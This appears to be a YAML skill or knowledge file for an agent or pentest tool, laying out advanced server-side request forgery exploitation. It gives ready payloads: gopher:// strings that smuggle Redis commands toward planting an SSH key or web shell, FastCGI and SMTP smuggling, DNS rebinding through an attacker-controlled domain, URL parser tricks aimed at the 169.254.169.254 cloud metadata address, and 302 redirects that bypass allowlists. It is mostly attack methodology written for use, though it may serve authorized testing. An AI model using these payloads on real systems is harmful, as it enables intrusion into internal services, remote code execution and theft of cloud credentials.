schema_version: 1
version: 3.0.0
name: ssrf-advanced
description: >
  Advanced Server-Side Request Forgery (SSRF) exploitation — Blind Out-of-Band (OAST) confirmation,
  Gopher protocol stream smuggling (Redis/FastCGI/SMTP), DNS rebinding attacks, and URL parser discrepancies.
triggers:
  - blind ssrf
  - oob ssrf
  - dns rebinding
  - gopher redis
  - url parser differential
  - ssrf chaining
  - gopher protocol
tools:
  - curl
  - python3
knowledge: |
  Advanced SSRF attacks target protocol smuggling, asynchronous out-of-band communication, and parser
  discrepancies between validation gateways and backend HTTP clients.

  1. BLIND OAST CONFIRMATION (OUT-OF-BAND SINK TRIAGE):
     When the application fetches URLs asynchronously (e.g. webhooks, PDF generators, link previews):
     - Supply an external interactsh or collaborator listener URL:
       `https://UNIQUE.interactsh-domain.com`
     - Observe incoming protocol:
       * DNS query only: Application resolves target domain but TCP connection is blocked by egress firewall.
       * DNS + HTTP GET: Application has full outbound egress; verify user-agent header to fingerprint HTTP client
         (e.g., Python-urllib, Apache-HttpClient, Go-http-client, cURL, Headless Chrome).

  2. GOPHER PROTOCOL STREAM SMUGGLING:
     When backend URL libraries support alternative schemes (cURL with ALL protocols enabled):
     Construct arbitrary TCP payload byte streams using `gopher://`:
     a. Redis Remote Command Execution:
        Inject Redis RESP protocol commands to write an authorized SSH key or web shell:
        `gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0D%0ACONFIG%20SET%20dbfilename%20dump.rdb%0D%0AQUIT`
     b. Internal FastCGI / PHP-FPM (Port 9000):
        Craft FastCGI binary records over gopher to invoke php-fpm handlers and execute arbitrary commands.
     c. Internal SMTP (Port 25):
        `gopher://127.0.0.1:25/_HELO%20target%0D%0AMAIL%20FROM:...%0D%0ARCPT%20TO:...`

  3. DNS REBINDING (TIME-OF-CHECK VS TIME-OF-USE - TOCTOU):
     When the application validates destination IP against a denylist before issuing the request:
     - Pre-request Check: The application resolves domain `rebind.attacker.com` -> returns benign IP (e.g. 1.2.3.4)
     - Validation: 1.2.3.4 is public -> check passes!
     - Request Execution: The HTTP client resolves domain `rebind.attacker.com` a second time -> returns 127.0.0.1 (TTL=0)
     - Tooling: Configure dual A records with TTL=0 using rbndr.us or custom authoritative DNS server:
       `http://7f000001.01020304.rbndr.us`

  4. URL PARSER DIFFERENTIALS & CREDENTIAL PARSING (@ / #):
     Different URL parsing libraries (Python urllib, Node.js WHATWG, Go net/url, cURL) disagree on authority boundaries:
     - Userinfo delimiter confusion:
       `http://expected-host.com@169.254.169.254/`
       (Validation regex checks string before '@', but HTTP client connects to host after '@')
     - Fragment identifier confusion:
       `http://169.254.169.254#@expected-host.com/`
     - Dotless decimal & hexadecimal IP notation:
       `http://2130706433/` (127.0.0.1 in decimal)
       `http://0x7f000001/` (127.0.0.1 in hex)

  5. HTTP 302 REDIRECT CHAINING (PRE-CHECK BYPASS):
     When input validation strictly rejects private IP strings:
     - Point the input parameter to an attacker web server returning HTTP 302:
       `Location: http://127.0.0.1:6379/`
     - If the HTTP client library follows redirects automatically, it bypasses the initial allowlist check.
